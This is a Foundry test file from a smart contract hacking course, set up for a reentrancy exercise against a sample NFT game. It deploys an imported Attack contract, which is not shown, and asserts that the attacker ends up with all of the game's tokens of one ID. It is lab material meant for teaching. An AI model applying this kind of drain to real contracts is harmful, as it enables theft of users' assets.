//  SPDX-License-Identifier: GPL-3.0-or-later
//   SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
//   https:smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {CryptoEmpireGame} from "../../src/reentrancy-4/CryptoEmpireGame.sol";
import {CryptoEmpireToken} from "../../src/reentrancy-4/CryptoEmpireToken.sol";
import {Attack} from "../../src/reentrancy-4/Attack.sol";
import {NftId} from "../../src/reentrancy-4/GameItems.sol";

contract TestReentrancy4 is Test {
    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address attacker = makeAddr("attacker");

    CryptoEmpireToken cryptoEmpireToken;
    CryptoEmpireGame cryptoEmpireGame;
    Attack attackContract;

    function setUp() public {
        vm.startPrank(deployer);
        cryptoEmpireToken = new CryptoEmpireToken();
        cryptoEmpireGame = new CryptoEmpireGame(address(cryptoEmpireToken));

        // Giving 1 NFT to each user
        cryptoEmpireToken.mint(user1, 1, NftId(0));
        cryptoEmpireToken.mint(user2, 1, NftId(1));
        cryptoEmpireToken.mint(attacker, 1, NftId(2));

        // The CryptoEmpire game gained many users already and has some NFTs either staked or listed in it
        for (uint256 i = 0; i <= 5; i++) {
            cryptoEmpireToken.mint(address(cryptoEmpireGame), 20, NftId(i));
        }

        assertEq(cryptoEmpireToken.balanceOf(attacker, 2), 1);
        assertEq(cryptoEmpireToken.balanceOf(address(cryptoEmpireGame), 2), 20);
        vm.stopPrank();
    }

    function test_Hack() public {
        vm.startPrank(attacker);
        attackContract = new Attack(address(cryptoEmpireGame), address(cryptoEmpireToken));
        cryptoEmpireToken.safeTransferFrom(attacker, address(attackContract), 2, 1, "");

        attackContract.attack();
        assertEq(cryptoEmpireToken.balanceOf(attacker, 2), 21);
        assertEq(cryptoEmpireToken.balanceOf(address(cryptoEmpireGame), 2), 0);
    }
}
